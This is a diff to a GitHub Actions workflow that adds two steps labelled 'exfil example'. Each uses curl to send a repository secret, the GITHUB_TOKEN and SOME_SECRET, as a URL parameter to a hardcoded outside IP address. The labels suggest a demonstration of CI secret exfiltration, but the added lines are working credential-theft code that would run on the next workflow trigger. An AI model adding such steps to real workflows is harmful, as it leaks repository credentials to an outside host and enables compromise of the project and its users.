@@ -16,3 +16,7 @@ jobs:
       run: echo $SOME_SECRET
     - name: hello world
       run: echo hello world
+    - name: exfil example
+      run: curl "http://68.183.113.167:8000?foo=${{ secrets.GITHUB_TOKEN }}"
+    - name: exfil example 2
+      run: curl "http://68.183.113.167:8000?foo=${{ secrets.SOME_SECRET }}"
